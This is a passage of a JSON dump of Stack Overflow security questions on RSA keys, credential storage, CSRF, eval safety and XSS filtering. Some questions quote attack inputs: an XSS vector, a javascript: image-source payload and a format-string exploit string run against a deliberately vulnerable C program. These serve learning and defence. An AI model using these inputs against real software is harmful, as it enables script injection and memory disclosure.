site-two.com, popup.html </p>\n\n<pre><code>&lt;script src=\"www.site1.com/JS/logoff.js\" /&gt;\n</code></pre>\n\n<p>In Site1.com's logoff.js</p>\n\n<pre><code>function ClosePopup(){\n\n self.opener.location = self.location.href; // Error permission denied\n</code></pre>\n\n<p>}</p>\n\n<p>All the properties of <strong>self.opener</strong> are all saying 'Access Denied'</p>\n\n<p>What could be the reason? Any help are appreciated !!</p>\n"},{"tags":["iphone","ios","security","rsa"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":2122,"score":2,"question_id":5942712,"title":"iOS - Creating SecKeyRef from exponent+modulus","body":"<p>I would like to decrypt a RSA-encoded blob on iPhone, by having an exponent and modulus as private key. In Java (with javax.crypto), this could be easily achieved by code like this:</p>\n\n<pre><code>// 1) key\nRSAPublicKeySpec keySpec = new RSAPublicKeySpec(myModulus, myPublicExponent);\nKeyFactory fact = KeyFactory.getInstance(\"RSA\");\nKey pubKey = fact.generatePublic(keySpec);\n\n// 2) cypher\nCipher cipher = Cipher.getInstance(\"RSA/ECB/PKCS1Padding\");\ncipher.init(Cipher.DECRYPT_MODE, keySpec);\n\n// 3) use cypher to decode my block to an output stream\n</code></pre>\n\n<p>But with the iPhone security API I can't create a SecKeyRef (key) other than by generating a pair or importing a certificate, which I don't have/want.</p>\n\n<p>Is there a way to create a key manually having a modulus + exponent? If so, can you give me a clue on how?</p>\n\n<p>Thanks in advance</p>\n"},{"tags":["javascript","security"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":63,"score":0,"question_id":12669692,"title":"Javascript: Un-able to create new hidden input element","body":"<p>I was following the code found in <a href=\"http://www.wikihow.com/Create-a-Secure-Login-Script-in-PHP-and-MySQL\" rel=\"nofollow\">here</a> to create a secure login page. The trouble is, it can't create the hidden input element.</p>\n\n<pre><code>function formhash(form, password) {\n    // Create a new element input, this will be out hashed password field.\n    var p = document.createElement(\"input\");\n    // Add the new element to our form.\n    form.appendChild(p);\n    p.name = \"p\";\n    p.type = \"hidden\"\n    p.value = hex_sha512(password.value);\n    // Make sure the plaintext password doesn't get sent.\n    password.value = \"\";\n    // Finally submit the form.\n    form.submit();\n}\n</code></pre>\n\n<p>I have read through saying that it only works for IE and not for gecko. Is this true or I just missing something?</p>\n\n<p>Update:</p>\n\n<p>The formhash function works when I place the javascript into the login page. When it is move to an external file, the problem starts again. </p>\n\n<p>@asprin Noted. The reason I place php is because the code was based on php implementation</p>\n\n<p>@Henrik Will do that. Thanks</p>\n\n<p>@RenePot Yup, it was called on the process_login.php page</p>\n\n<p>@MarkGarcia Thanks for the suggestion. Notice it say's that the function wasn't declare</p>\n\n<p>@WernerVesters Not sure but I think after. </p>\n\n<p>@Quentin Thanks for the suggestion. Will do that :D </p>\n"},{"tags":["security","passwords"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":12666437,"title":"Where can I access a word list of normal vocabulary level English words?","body":"<p>Not sure if this is really a programming question, but I am asking a resource relevant to programming...</p>\n\n<p>I have a password generator hosted from <a href=\"http://JonathansCorner.com/passwords/\" rel=\"nofollow\">http://JonathansCorner.com/passwords/</a>, whose premise is the only general way I know that generates passwords that are both strong and user-friendly: string together dictionary words with nonword characters.</p>\n\n<p>The dictionary it originally used was the Cracklib word list, which contains any number of obscure, recherch&eacute; terms, which is appropriate in a Cracklib password checking dictionary, but frustratingly opaque to a user (\"I'm supposed to remember 'Menkar' as a word???\"). I tried to make the words just a little less recherch&eacute; by cutting the dictionary to words six characters or less, and this was definitely an improvement in more than one way, but the vocabulary still remains stubbornly obscure; I'm just asking people to remember obscure 5-6 letter words instead of obscure 10-12 letter words.</p>\n\n<p>I know that Basic English would provide one extreme option (possibly at the expense of real password strength), but I wanted to ask if there was a dictionary available at about an eighth grade reading level so a reasonably literate user would see only familiar words in most passwords, but I was wondering if there was any programming resource available that would provide more or less a fairly complete vocabulary of fairly familiar words.</p>\n"},{"tags":["c#","security","data","local"],"answer_count":3,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":163,"score":3,"question_id":12657792,"title":"How to securely save username/password (local)","body":"<p>\nI'm making a windows application, which you need to log into first.<br/>\nThe account details consist of username and password, and they need to be saved locally.<br/>\nIt's just a matter of security, so other people using the same computer can't see everyone's personal data.<br/>\n<strong>What is the best/most secure way to save this data?</strong>\n</p>\n\n<p>\n<em>I don't want to use a database, so I tried some things with Resource files.<br/>\nBut since I'm kind of new with this, I'm not entirely sure of what I'm doing and where I should be looking for a solution.</em>\n</p>\n"},{"tags":["php","database","security","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":59,"score":0,"question_id":12672274,"title":"Security for a User web application","body":"<p>I've been wondering about the security aspect of my application.\nI'm using CodeIgniter PHP Framework for my project.</p>\n\n<p>I'd like to know some \"expert\" opinions on this.\nI have a login function.\nWhen a user logged in, the session is store in database. I added information like user Id in the information session.\nA user can create a company. But to do that, I first check his account to see if he already has one. \nThis session user Id allows me to run a DB request to find that out.\nFor example :</p>\n\n<pre><code>function create(){\n    $hasCompany = $this-&gt;Accountmodel-&gt;hasCompany($this-&gt;session-&gt;userdata('id'));\n    if($hasCompany){\n        $data['company'] = $this-&gt;Companymodel-&gt;getCompanyInfo($this-&gt;session-&gt;userdata('id');\n        $this-&gt;load-&gt;view('company/panel', $data);\n    }\n    else{\n        $this-&gt;load-&gt;view('company/create');\n    }\n\n}\n</code></pre>\n\n<p>And then if he has one, I can print the company edit/delete panel.\nIt allows me to avoid the use of id parameters in the url like :\nmyserver.com/company/edit/[id]</p>\n\n<p>So to get to the point, I was wondering if, in term of security, this is ok or there is some kind of vulnerability.</p>\n\n<p>Any advices are welcome !</p>\n"},{"tags":["security","homework","cryptography","computer-science","discrete-mathematics"],"answer_count":1,"favorite_count":2,"up_vote_count":1,"down_vote_count":0,"view_count":161,"score":1,"question_id":1734936,"title":"RSA cryptosystem","body":"<p>Hi i am trying to set up an RSA cryptosystem i have all the values except d selected prime numbers: <code>p=1889</code>, <code>q=2003</code>, <code>n=3783667</code>, <code>phi=3779776</code>, <code>e= 61</code></p>\n\n<p>i got stuck finding d could anyone help me to figure it out?</p>\n\n<p>Setting up an RSA cryptosystem</p>\n\n<ul>\n<li>Two large distinct prime numbers <code>p</code> and <code>q</code> are selected, and <code>n = pq</code> and <code>(n) = (p  1)(q  1)</code> are calculated.</li>\n<li><p>An integer <code>e</code> is selected such that <code>gcd((n), e) = 1</code> and the multiplicative inverse <code>d = e^(1)</code> in <code>Z(n)</code> is calculated, i.e.</p>\n\n<p>ed  1 (mod (n)).</p></li>\n<li><p>The numbers <code>p</code>, <code>q</code>, and <code>(n)</code>, are then discarded.</p></li>\n<li>The pair <code>(e, n)</code> is published as the public encryption key</li>\n<li>The number <code>d</code> is the secret decryption key.</li>\n</ul>\n"},{"tags":["security","iis7"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":11,"score":0,"question_id":12671307,"title":"Restrict outside users IIS 7","body":"<p>I have IIS 7 where I host websites accessable to the outside world. But I would like 1 specific website just to be viewed within our local network. Can this be done on IIS7?</p>\n\n<p>Thanks,</p>\n"},{"tags":["security","digital-signature"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":13,"score":0,"question_id":12420384,"title":"Combined digital signature for checking if majority of signed elements are not changed","body":"<p>I'm not familiar with the field, so please excuse me if the question seems trivial or dull.</p>\n\n<p>I have N strings which I need to sign in such a way, that the signature remains valid if\nup to M strings are changed, removed, or added. N > M, N may vary. The signature should not allow for deducing N from the signature itself.</p>\n\n<p>All I can imagine so far, is a strightforward approach with building hashes for each string separately, and storing them all as signature, but it does not comply with the latest requirement.</p>\n\n<p>If there exist some language specific examples, please mention them as well, - Java, C++, PHP, etc. are OK.</p>\n"},{"tags":["php","security","xss","xss-prevention"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":12670501,"title":"Web cruiser is showing XSS vulnerability while the input data is already cleaned and sanitized","body":"<p>Currently I am using Web Cruiser to scan the vulnerability of a particular website which is showing me lots of cross site scripting errors while I have already done with filtering the input data at server side.</p>\n\n<p>At the server side, I have made a function that clears the input data :</p>\n\n<pre><code>function mssql_escape($data) {\n    $filtered_data = filter_var($data, FILTER_SANITIZE_STRING);\n    $secure_class = new security_class(); /* Code igniter Security class */ \n    $clean_data = $secure_class-&gt;xss_clean($filtered_data);                         \n    return $clean_data;\n}\n</code></pre>\n\n<p>My search action page is like this :</p>\n\n<pre><code>if(isset($_POST['reg_no'])&amp;&amp;$_POST['reg_no']!='')\n{\n  $reg = filter_var($_POST[reg_no], FILTER_SANITIZE_NUMBER_INT);\n  $sql.= \" and C.REGISTRATION_NO like '\".mssql_escape($reg).\"' \";    \n}           \nif(isset($_POST['company_name'])&amp;&amp;$_POST['company_name']!='')\n{           \n  $comp_name = mssql_escape($_POST[company_name]);          \n  $sql.= \" and C.ENGLISH_NAME like '%\".$comp_name.\"%' \";    \n}\n</code></pre>\n\n<p>My form is like this :</p>\n\n<pre><code>&lt;tr&gt;\n    &lt;td&gt;Registration No.&lt;/td&gt;\n    &lt;td colspan=\"2\"&gt;&lt;input type=\"text\" name=\"reg_no\" id=\"reg_no\" value=\"&lt;?php echo mssql_escape($_POST['reg_no']) ?&gt;\" /&gt;&lt;/td&gt;\n&lt;/tr&gt;\n&lt;tr&gt;\n    &lt;td&gt;Company Name&lt;/td&gt;\n    &lt;td colspan=\"2\"&gt;&lt;input type=\"text\" name=\"company_name\" id=\"company_name\" value=\"&lt;?php echo isset($_POST['company_name'])?mssql_escape($_POST['company_name']):'' ?&gt;\" /&gt;&lt;/td&gt;\n&lt;/tr&gt;\n</code></pre>\n\n<p>Now, please help me find out my fraud thats why the web cruiser is finding the cross site scripting vulnerability from this page. Thanks in advance.</p>\n"},{"tags":["security","mongodb","symfony2","doctrine2","symfony-2.1"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":67,"score":0,"question_id":12666155,"title":"Can't use a Doctrine repository as user provider","body":"<p>I'm trying to create a <a href=\"http://symfony.com/doc/master/cookbook/security/custom_provider.html\" rel=\"nofollow\">custom user provider</a>.</p>\n\n<p>I defined my <code>UserProvider</code> as a service:</p>\n\n<pre><code>myvendor.user_provider:\n  class: MyVendor\\UserBundle\\Service\\Security\\UserProvider\n</code></pre>\n\n<p>This class is a <code>DocumentRepository</code>:</p>\n\n<pre><code>namespace MyVendor\\UserBundle\\Service\\Security;\n\nuse Symfony\\Component\\Security\\Core\\User\\UserInterface;\nuse Symfony\\Component\\Security\\Core\\User\\UserProviderInterface;\nuse Symfony\\Component\\Security\\Core\\Exception\\UsernameNotFoundException;\nuse Symfony\\Component\\Security\\Core\\Exception\\UnsupportedUserException;\nuse Doctrine\\ODM\\MongoDB\\DocumentRepository;\nuse Doctrine\\ODM\\MongoDB\\DocumentNotFoundException;\n\nclass UserProvider extends DocumentRepository implements UserProviderInterface {\n    //public function loadUserBy...\n}\n</code></pre>\n\n<p>But I get this error:</p>\n\n<pre><code>Catchable Fatal Error: Argument 1 passed to Doctrine\\ODM\\MongoDB\\DocumentRepository::__construct() must be an instance of Doctrine\\ODM\\MongoDB\\DocumentManager, none given, called in /home/www/dev/public/myapp/app/cache/dev/appDevDebugProjectContainer.php on line 258 and defined in /home/www/dev/public/myapp/vendor/doctrine/mongodb-odm/lib/Doctrine/ODM/MongoDB/DocumentRepository.php line 68 \n</code></pre>\n\n<p>Seems like the document manager has not been created yet at that point, because I also tried injecting it, but it complains about its own dependencies, like the <code>UnitOfWork</code>.</p>\n\n<p>What can I do?</p>\n"},{"tags":["php","security","joomla","joomla2.5"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":12661626,"title":"Joomla's template override and security","body":"<p>So whenever you need to make a change to a component, module, etc you're supposed to use an override so that it won't be altered on future core updates.</p>\n\n<p>Could those overrides be a security risk as the base code is now older as you update the core?  I've never seen any mention of updating the overrides with new updates.</p>\n"},{"tags":["facebook","security","web-security","facebook-apps"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":55,"score":0,"question_id":12660425,"title":"Security Alert for links published by our App and on links pasted on Fan Page","body":"<p>I am seeing security alert with the following message:</p>\n\n<p>\"The link you are trying to visit has been classified as potentially abusive by a Facebook partner. To learn more about staying safe on the Internet, visit Facebook's Security Page\"</p>\n\n<p>On siteadvisor, it says:</p>\n\n<p>\"We've tested millions of websites, but we haven't tested this one yet. Be the first one to submit feedback on it!\"</p>\n\n<p>I have a facebook app and I am unable to even go to the app via the Fan Page of my app. This is really annoying and I have no clue how to fix this. I have tried contacting Facebook as well but I am not sure if they will respond.</p>\n"},{"tags":["sql-server","security","ssas"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":39,"score":2,"question_id":12662114,"title":"Secured views in SQL Server Analysis Services","body":"<p>We have an SSAS 2012 instance containing a series of measure tables and dimension tables. One of the dimension tables relates to a client and serves to organise information by client.</p>\n\n<p>Recently we were given the requirement that one client should be secured from view from another, i.e, users would be given 'access' to a given client and can therefore only view that client's data. </p>\n\n<p>I wondered what the best way or achieving this goal would be. Currently anyone could create a pivot in excel for any client. I can only see the possibility of creating and securing seperate databases and ultimately separate cubes for each client.</p>\n\n<p>Any advice would be greatly appreciated.</p>\n"},{"tags":["html","security","unicode","syntax","xss"],"answer_count":2,"favorite_count":0,"up_vote_count":4,"down_vote_count":0,"view_count":123,"score":4,"question_id":12662908,"title":"What type of syntax is \"%u00AB\"?","body":"<p>In <a href=\"http://www.barracudalabs.com/wordpress/index.php/2009/06/05/unicode-encoding-for-bypassing-xss-filters/\" rel=\"nofollow\">this</a> article, I'm warned of an XSS attack vector <code>\"%u00ABscript%u00BB\"</code>.  I'm wondering what type of syntax <code>\"%u00AB\"</code> is.  In my brief tests on Chromium, it doesn't actually get rendered into a tag, leading me to believe that the syntax is used by either an SQL engine, or a server side programming language.  I'm not concerned with stored/reflected XSS, only DOM-based ones.  I don't recognize it though, so maybe its like ruby or python or something?</p>\n\n<p>Also, does anyone know if its an issue in other browsers? I only tested Chromium, but perhaps other versions and browsers behave differently and are therefore vulnerable.</p>\n"},{"tags":["database","security","postgresql"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":48,"score":1,"question_id":12662122,"title":"Securing Credentials for DB access","body":"<p>I need ensure the data safety (no unwanted reading or writing) in a software that will be running in the user machine (both application and database). </p>\n\n<p>I know for sure that storing the DB credentials hardcoded isn't a good one, but in this scenario it seems I am running short of alternatives.\nIf I can't avoid this, is there a way PostgreSQL will keep an access log safe from user modification?</p>\n\n<p>What is the best approach to avoid user access to a database stored in its own machine?</p>\n"},{"tags":["ruby-on-rails","security","devise","cancan"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":12663531,"title":"Security: using CanCan to make sure user cannot see other users' profiles","body":"<p>I've got an app that uses Devise, CanCan and Rolify to deal with authentication and authorization.  But I don't think I'm using these gems to the full extent.  Right now the only thing in my ability class is this:</p>\n\n<pre><code>class Ability\n\n  include CanCan::Ability\n\n  def initialize(user)\n    user ||= User.new # guest user (not logged in)\n    if user.has_role? :admin\n      can :manage, :all\n    else\n      can :read, :all\n    end\n  end\nend\n</code></pre>\n\n<p>I found a security hole where an authenticated user is able to look at other user profiles.  I fixed it by changing some code in the user controller.</p>\n\n<pre><code>def show\n  @user = current_user.has_role?(:admin) ? User.find(params[:id]) : current_user\nend\n</code></pre>\n\n<p>Is this the best way to deal with this hole?  Is there a best practice or a rails convention that addresses this in a different way?</p>\n"},{"tags":["security","jsf","java-ee","java-ee-6","jdbcrealm"],"answer_count":0,"favorite_count":2,"up_vote_count":2,"down_vote_count":0,"view_count":52,"score":2,"question_id":12658078,"title":"JEE Security Roles in the EJB Container and how they Propagate From and/or Relate to the Web Container","body":"<p>I did a test the other day on an app I'm working on. I wanted to see how the security propagated from web tier to JEE container. I wrote a quick couple of pages, a backing bean and an EJB stateless bean to do this. I set it up so I could log in and check what the principal and roles I was in on the web tier and on the EJB container. </p>\n\n<p>The call to the EJB context said that I had the same principal as the call through the Faces Context. However, while the web tier reported (getRole) confirmed as expected that I was in the groups set up in the database, the call to the EJB side failed and raised an exception. Basically it said it could find there were no groups like I was asking it about configured in its context. And indeed, I have done no security configuration on the EJB side.</p>\n\n<p>I seem to missing something here. What do I need in order make sure that both sides are in sync in terms of roles/groups. I have configured the web side such that it maps the users to groups via the JDBC realm (that is not custom that is a standard configuration option).</p>\n\n<p>Note that I am on Glassfish 3.1.1 and I created a customized JDBC Realm to match my groups to my users in what I think is a cleaner way (i.e. using a lookup table in between). FWIW, I have been around in software for a long while, but just getting used to full stack JEE (about a year). </p>\n"},{"tags":["c#","database","security","encryption","obfuscation"],"answer_count":3,"favorite_count":1,"up_vote_count":8,"down_vote_count":0,"view_count":4276,"score":8,"question_id":619921,"title":"How do you hide an encryption key in a .NET application?","body":"<p>I'm developing an intranet application (C#) that uses some data (local to the web server) that we'd like to keep private. This data is encrypted (AES) using a legacy data repository. We can't totally prevent physical access to the machine.</p>\n\n<p>Clearly, we're never going to have perfect security here. However, we want to make it as hard as possible for anyone to gain unauthorized access to the data.</p>\n\n<p>The question is how best to store the key. Encrypting it based on some machine specific ID is an option, but that information would be readily available to anyone running a diagnostic tool on the machine.</p>\n\n<p>Encoding it in the application is an option (it's a one off application). However, .NET assemblies are pretty easy to decompile. So, would it be best to obfuscate it, use an encryption launcher, compile it?</p>\n\n<p>Or is there an option I'm missing?</p>\n\n<p>Just so we're clear, I know it's pretty much a lost cause if someone is determined, but we're looking to make it as hard as possible within the constraints.</p>\n"},{"tags":["python","security","eval"],"answer_count":6,"favorite_count":6,"up_vote_count":10,"down_vote_count":0,"view_count":3224,"score":10,"question_id":661084,"title":"Security of Python's eval() on untrusted strings?","body":"<p>If I am evaluating a Python string using eval(), and have a class like:</p>\n\n<pre><code>class Foo(object):\n    a = 3\n    def bar(self, x): return x + a\n</code></pre>\n\n<p>What are the security risks if I do not trust the string? In particular:</p>\n\n<ol>\n<li>Is <code>eval(string, {\"f\": Foo()}, {})</code> unsafe? That is, can you reach os or sys or something unsafe from a Foo instance?</li>\n<li>Is <code>eval(string, {}, {})</code> unsafe? That is, can I reach os or sys entirely from builtins like len and list?</li>\n<li>Is there a way to make builtins not present at all in the eval context?</li>\n</ol>\n\n<p>There are some unsafe strings like \"[0] * 100000000\" I don't care about, because at worst they slow/stop the program. I am primarily concerned about protecting user data external to the program.</p>\n\n<p>Obviously, <code>eval(string)</code> without custom dictionaries is unsafe in most cases.</p>\n"},{"tags":["c","security","openssl","rsa","pem"],"answer_count":1,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":190,"score":3,"question_id":12647220,"title":"Reading and writing rsa keys to a pem file in C","body":"<p>I am writing a C program to generate keys for RSA and write them to a file and then read from them. The homework requires me to generate the files in a openssl format. So, I chose PEM. Now, I have the following function for creating the file</p>\n\n<pre><code>rsa = RSA_new();\n// These 3 keys are generated beforehand\nrsa-&gt;e = e;\nrsa-&gt;n = n;\nrsa-&gt;d = d;\n\nfp = fopen(pubkey_file, \"w\");\nif(!PEM_write_RSAPublicKey(fp, rsa))\n{\n    printf(\"\\n%s\\n\", \"Error writing public key\");\n}\nfflush(fp);\nfclose(fp);\n\nfp = fopen(privkey_file, \"w\");\n// pRsaKey = EVP_PKEY_new();\n// EVP_PKEY_assign_RSA(pRsaKey, rsa);\nif(!PEM_write_RSAPrivateKey(fp, rsa, NULL, 0, 0, NULL, NULL))\n// if (!PEM_write_PrivateKey(fp, pRsaKey, NULL, NULL, 0, 0, NULL))\n{\n    printf(\"\\n%s\\n\", \"Error writing private key\");\n}\nfflush(fp);\nfclose(fp);\n</code></pre>\n\n<p>And this is the function to read the files</p>\n\n<pre><code>rsa = RSA_new();\nfp = fopen(pubkey_file, \"r\");\nif(PEM_read_RSAPublicKey(fp, &amp;rsa, NULL, NULL) == NULL)\n{\n    printf(\"\\n%s\\n\", \"Error Reading public key\");\n    return;\n}\n\nfclose(fp);\nBN_bn2bin(rsa-&gt;n, (unsigned char *)modulus);\nBN_bn2bin(rsa-&gt;e, (unsigned char *)exp);\nprintf(\"\\n%s\\n%s\\n\", exp, modulus);\nRSA_free(rsa);\n\n// pRsaKey = EVP_PKEY_new();\nfp = fopen(privkey_file, \"r\");\nif(fp)\n    // if((PEM_read_PrivateKey(fp, &amp;pRsaKey, NULL, NULL)) == NULL)\n    if((PEM_read_RSAPrivateKey(fp, &amp;rsa, NULL, NULL)) == NULL)\n    {\n        printf(\"\\n%s\\n\", \"Error Reading private key\");\n        return;\n    }\n// rsa = RSA_new();\n// rsa = EVP_PKEY_get1_RSA(pRsaKey);\nfclose(fp);\n</code></pre>\n\n<p>The public key is written and read as required, but the provate key fails. I have tried writing using both the rsa and the evp(which is commented in the above code). But, both fail. I cannot get my head around why this is happening or try and find where to look to debug this issue. Can anyone please provide some pointers for this?</p>\n"},{"tags":["python","security","permissions","execute"],"answer_count":4,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":73,"score":0,"question_id":12660787,"title":"Execution permissions in Python","body":"<p>I need to send code to remote clients to be executed in them but security is a concern for me right now. I don't want unsafe code to be executed there so I would like to control what a program is doing. I mean for example, know if is making connections, where is connecting to, if is reading local files, etc. Is this possible with Python?</p>\n\n<p>EDIT: I'm thinking in something similar to Android permission system. I want to know what a code will do and if it does something different, stop it.</p>\n"},{"tags":["java","spring","security","authentication","spring-security"],"answer_count":0,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":20,"score":1,"question_id":12659728,"title":"Spring security Saved URL RequestCache does not store # (hash)","body":"<blockquote>\n  <p><strong>Possible Duplicate:</strong><br>\n  <a href=\"http://stackoverflow.com/questions/317760/how-to-get-url-hash-from-server-side\">How to get Url Hash (#) from server side</a>  </p>\n</blockquote>\n\n\n\n<p>I am using Spring security to protect resources on our application. Unfortunately, spring does not store the full url's that include a # . E.g.:</p>\n\n<pre><code>example.com/account/file#1234\n</code></pre>\n\n<p>The <code>#1234</code> is not stored in the request cache before being redirected to the login page and the security process. Once returned from authentication, the url redirected to is :</p>\n\n<pre><code>example.com/account/file\n</code></pre>\n\n<p>Is there any way to make spring store the full url?</p>\n"},{"tags":["javascript","html","security","xss","img"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":45,"score":0,"question_id":12658992,"title":"Why are javascript: URIs allowed in the src attribute of <img> tags?","body":"<p>On practically every XSS mitigation guide I've seen, the following pattern is mentioned:</p>\n\n<pre><code>&lt;img src=\"javascript:evil();\"&gt;\n</code></pre>\n\n<p>What legitimate use could this possibly have?  Can you use JS code to generate a base64-encoded representation or something?</p>\n"},{"tags":["php","security","validation","base64"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":51,"score":2,"question_id":12658661,"title":"Validating base64 encoded images","body":"<p>I'm building an application that allows the user to <code>POST</code> HTML5 canvas data that is then encoded in base64 and displayed to all users. I am considering parsing the data into an actual .png file and storing on the server, but the base64 route allows me to store the images in a database and minimize requests. The images are unique, few, and the page won't be refreshed often.</p>\n\n<p>A bit of jQuery will take the canvas data, <code>data:image/png;base64,iVBORw...</code> and passes it along to a PHP script that wraps it like so: <code>&lt;img src=\"$data\"&gt;&lt;/img&gt;</code></p>\n\n<p>However, security is cornerstone and need to validate the base64 canvas data to prevent passing malicious data in the <code>POST</code> request. My primary concern is to prevent external URLs from being injected into the <code>&lt;img&gt;</code> tag and being requested on page load.</p>\n\n<p>I currently have a setup like this:</p>\n\n<pre><code>$data = (isset($_POST['canvas']) &amp;&amp; is_string($_POST['canvas'])) ? $_POST['canvas'] : null;\n$base = str_replace('data:image/png;base64,', '', $data);\n$regx = '~^([A-Za-z0-9+/]{4})*([A-Za-z0-9+/]{4}|[A-Za-z0-9+/]{3}=|[A-Za-z0-9+/]{2}==)$~'\n\nif ((substr($data, 0, 22)) !== 'data:image/png;base64,')\n{\n  // Obviously fake, doesn't contain the expected first 22 characters.\n  return false;\n}\n\nif ((base64_encode(base64_decode($base64, true))) !== $base64)\n{\n  // Decoding and re-encoding the data fails, something is wrong\n  return false;\n}\n\nif ((preg_match($regx, $base64)) !== 1) \n{\n  // The data doesn't match the regular expression, discard\n  return false;\n}\n\nreturn true;\n</code></pre>\n\n<p>I want to make sure my current setup is safe enough to prevent external URLs from being inserted into the <code>&lt;img&gt;</code> tag, and if not, what can be done to further validate the image data?</p>\n"},{"tags":["security","gwt","csrf","gwt-rpc"],"answer_count":4,"favorite_count":1,"up_vote_count":7,"down_vote_count":0,"view_count":4306,"score":7,"question_id":2609834,"title":"GWT RPC - Does it do enough to protect against CSRF?","body":"<p><strong>UPDATE</strong> : GWT 2.3 introduces a better mechanism to fight XSRF attacks. See <a href=\"http://code.google.com/webtoolkit/doc/latest/DevGuideSecurityRpcXsrf.html\" rel=\"nofollow\">http://code.google.com/webtoolkit/doc/latest/DevGuideSecurityRpcXsrf.html</a></p>\n\n<hr/>\n\n<p>GWT's RPC mechanism does the following things on every HTTP Request - </p>\n\n<ol>\n<li>Sets two custom request headers - X-GWT-Permutation and X-GWT-Module-Base</li>\n<li>Sets the content-type as text/x-gwt-rpc; charset=utf-8</li>\n</ol>\n\n<p>The HTTP request is always a POST, and on server side GET methods throw an exception (method not supported). </p>\n\n<p>Also, if these headers are not set or have the wrong value, the server fails processing with an exception \"possibly CSRF?\" or something to that effect.</p>\n\n<p>Question is : Is this sufficient to prevent CSRF? Is there a way to set custom headers and change content type in a pure cross-site request forgery method?</p>\n"},{"tags":["c","security","format-string"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":50,"score":0,"question_id":12657246,"title":"How do I use formatstring to print out a string?","body":"<p>I'm going through tutorials on formatstring vulnerabilities to learn how to code more securely. The program I've written so far is as follows:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main(int argc, char *argv[]) {\n    char text[100];\n    strcpy(text, argv[1]);\n\n    printf(text);\n}\n</code></pre>\n\n<p>I'm running it like this:</p>\n\n<pre><code>&gt;&gt;&gt; ./foo $(ruby -e 'print \"AAAA\" + \"%08x.\"*9 + \"%x\"')\nAAAAffe466f4.00000001.f763b1c9.ffe458df.ffe458de.00000000.ffe459c4.ffe45964.00000000.41414141\n</code></pre>\n\n<p>I can see the \"41414141\" at the end, which is the AAAA at the beginning of the string. However, when I use \"%s\" instead like so:</p>\n\n<pre><code>&gt;&gt;&gt; ./foo $(ruby -e 'print \"AAAA\" + \"%08x.\"*9 + \"%s\"')\n</code></pre>\n\n<p>I get a segfault. Can anyone point me in the right direction?</p>\n"},{"tags":["security","encryption"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":36,"score":0,"question_id":12655575,"title":"Encrypting text","body":"<p>I'm wondering if it's possible to encrypt text client side.</p>\n\n<p>The situation is that I have a block of text I want to encrypt, and then save the encrypted text to a file. Only after a certain amount of time has passed will my program decrypt it. Another requirement I have is to be able to transfer the file with the encrypted text and be able to decrypt it with other copies of my program on various machines.</p>\n\n<p>The problem is where to store the key. The only implementation I can think of that would work is if I store the key server side, and have it return the key after a certain time has passed.</p>\n\n<p>Is there a way to do this client side (i.e. without any internet access)?</p>\n"},{"tags":["java","security","exception","applet"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":1298,"score":2,"question_id":12648798,"title":"Java: Security Exception - illegal url redirect","body":"<p>Has anyone encountered this before? It's causing me alot of trouble getting an appplet working. The reason I think it's not working is due to the socket that is in my program to communicate with a server. However, I cannot figure out how to stop it, and google isn't helping. I can't get an exception because the java console for google chrome isn't outputting the error, only giving me a popup after clicking the errored-applet saying that it errored. If code is needed, i will add. Thanks ahead of time.</p>\n\n<pre><code>security:  --- parseCommandLine converted : -Djava.net.preferIPv4Stack=true\ninto:\n[-Djava.net.preferIPv4Stack=true]\nbasic: Added progress listener: sun.plugin.util.ProgressMonitorAdapter@acf892\nbasic: Plugin2ClassLoader.addURL parent called for http://voidchar.com/Other/DatRLTest.jar\nbasic: Plugin2ClassLoader.addURL parent called for http://voidchar.com/Other/SharedClasses.jar\nsecurity: Blacklist revocation check is enabled\nsecurity: Trusted libraries list check is enabled\nnetwork: Cache entry found [url: http://voidchar.com/Other/DatRLTest.jar, version: null] prevalidated=false/0\ncache: Resource http://voidchar.com/Other/DatRLTest.jar has expired.\nnetwork: Connecting http://voidchar.com/Other/DatRLTest.jar.pack.gz with proxy=DIRECT\nnetwork: Connecting http://voidchar.com:80/ with proxy=DIRECT\nbasic: exception: illegal URL redirect.\njava.lang.SecurityException: illegal URL redirect\nat com.sun.deploy.net.HttpUtils.followRedirects(Unknown Source)\nat com.sun.deploy.net.BasicHttpRequest.doRequest(Unknown Source)\nat com.sun.deploy.net.BasicHttpRequest.doGetRequestEX(Unknown Source)\nat com.sun.deploy.cache.ResourceProviderImpl.checkUpdateAvailable(Unknown Source)\nat com.sun.deploy.cache.ResourceProviderImpl.isUpdateAvailable(Unknown Source)\nat com.sun.deploy.cache.DeployCacheHandler.get(Unknown Source)\nat sun.net.www.protocol.http.HttpURLConnection.plainConnect(Unknown Source)\nat sun.net.www.protocol.http.HttpURLConnection.connect(Unknown Source)\nat sun.net.www.protocol.http.HttpURLConnection.getInputStream(Unknown Source)\nat 